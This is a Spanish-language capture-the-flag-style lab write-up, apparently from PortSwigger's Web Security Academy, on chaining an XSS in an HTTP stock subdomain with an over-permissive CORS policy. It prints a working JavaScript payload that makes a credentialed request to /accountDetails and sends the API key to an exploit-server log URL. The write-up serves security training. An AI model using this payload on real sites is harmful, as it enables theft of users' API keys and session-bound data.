## Vulnerabilidad CORS con protocolos inseguros confiables

**Objetivo**: Explotar una configuración de CORS que confía en subdominios inseguros (HTTP) utilizando un ataque encadenado con XSS para robar la API Key.

### 1. Reconocimiento (Fingerprinting & Columnas)
Verificar la confianza del servidor en subdominios arbitrarios y protocolos inseguros mediante Burp Repeater:

**Payload (Header)**:

```HTTP
Origin: http://stock.YOUR-LAB-ID.web-security-academy.net
```

**Explicación**:

Reflexión de subdominio: El servidor devuelve Access-Control-Allow-Origin: http://stock..., lo que confirma que confía en cualquier subdominio, incluso si utiliza HTTP en lugar de HTTPS.

*Access-Control-Allow-Credentials*: Al estar en **true**, permite que las peticiones desde el subdominio incluyan las cookies de sesión del usuario.

XSS en Subdominio: Se identifica que el parámetro productId en el subdominio de stock es vulnerable a XSS, lo que nos da el "pie" para ejecutar código desde un origen permitido.

### 2. Explotación (Extracción de API Key)
Se utiliza el servidor de exploits para redirigir a la víctima al subdominio vulnerable e inyectar el script que extraerá los datos mediante CORS:

**Payload (HTML/JS)**:

```HTML
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

**Explicación**:

*document.location*: Redirige a la víctima al subdominio stock (que es un origen de confianza para la API).

Inyección XSS: El script dentro de productId realiza una petición AJAX hacia /accountDetails en el dominio principal.

*withCredentials = true*: Como el navegador de la víctima ya tiene la sesión iniciada en el dominio principal, adjunta las cookies automáticamente gracias a la configuración permisiva de CORS.

Exfiltración: El reqListener envía la respuesta (que contiene la API Key) a nuestro servidor de logs.

### 📝 Resumen Técnico
¿Por qué funciona? Porque el dominio principal tiene una "lista blanca" demasiado amplia que incluye subdominios que no controlan bien la seguridad (como el de stock con XSS) y protocolos inseguros (HTTP).

¿Qué es un ataque encadenado? Es el uso de una vulnerabilidad menor (XSS en un subdominio de stock) para pivotar y explotar una vulnerabilidad mayor (CORS en el dominio principal).

¿Por qué es peligroso HTTP en CORS? Porque un atacante en la misma red (MitM) podría interceptar el tráfico HTTP del subdominio o inyectar código en él para saltarse las protecciones de seguridad del dominio principal HTTPS.